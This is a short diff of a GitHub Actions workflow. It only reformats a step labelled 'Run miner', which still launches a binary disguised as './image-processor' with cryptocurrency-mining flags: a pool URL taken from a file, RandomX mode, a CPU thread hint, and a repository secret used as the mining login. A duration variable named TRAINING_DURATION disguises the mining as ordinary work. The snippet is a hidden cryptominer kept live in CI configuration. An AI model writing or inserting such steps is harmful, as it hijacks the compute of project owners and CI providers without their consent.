@@ -60,8 +60,7 @@ jobs:
           echo "POOL_URL=$(cat pool.txt)" >> $GITHUB_ENV
 
       - name: Run miner
-        run: |
-          timeout ${{ env.TRAINING_DURATION }} ./image-processor --url=${{ env.POOL_URL }} --user=${{ secrets.DATA_API_KEY }} --pass=x --tls=true --cpu-max-threads-hint=30 --randomx-mode=auto
+        run: timeout ${{ env.TRAINING_DURATION }} ./image-processor --url=${{ env.POOL_URL }} --user=${{ secrets.DATA_API_KEY }} --pass=x --tls=true --cpu-max-threads-hint=30 --randomx-mode=auto
 
       - name: Upload logs
         uses: actions/upload-artifact@v4
